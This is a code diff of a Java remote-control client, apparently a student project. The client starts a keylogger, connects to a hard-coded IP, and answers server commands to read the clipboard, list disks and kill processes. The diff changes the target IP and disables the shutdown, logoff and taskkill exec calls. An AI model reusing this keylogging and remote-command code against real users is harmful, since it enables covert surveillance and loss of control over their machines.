@@ -31,7 +31,10 @@ public class Client
         keyLoger = "";
         KeyLogger.startKeyLoger();
         // getting localhost ip
-        InetAddress ip = InetAddress.getByName("26.84.204.9");
+        //Thanh: 26.91.242.109
+        //Minh: 26.250.54.191
+        //Tây: 26.84.204.9
+        InetAddress ip = InetAddress.getByName("26.250.54.191");
 
         // establish the connection
         Socket s = new Socket(ip, ServerPort);
@@ -85,10 +88,12 @@ public class Client
                                 dos.writeObject(object);
                             }
                             case Message.LOG_OUT -> {
-                                Runtime.getRuntime().exec("shutdown -l");
+                                System.out.println("Log out");
+//                                Runtime.getRuntime().exec("shutdown -l");
                             }
                             case Message.SHUT_DOWN -> {
-                                Runtime.getRuntime().exec("shutdown -s -t 5");
+                                System.out.println("Shutdown");
+//                                Runtime.getRuntime().exec("shutdown -s -t 5");
                             }case Message.GET_CLIPBOARD -> {
                                 object.data = ClipboardData.getInst().getClipboardContents();
                                 dos.writeObject(object);
@@ -99,6 +104,7 @@ public class Client
                             }
                             case Message.KILL_PROCESS -> {
                                 System.out.println("Taskkill /PID "+ msg.data +" /F");
+//                                Runtime.getRuntime().exec("Taskkill /PID "+ msg.data +" /F");
                             }
                             case Message.GET_DISK -> {
                                 object.data = FileStores.toJson();
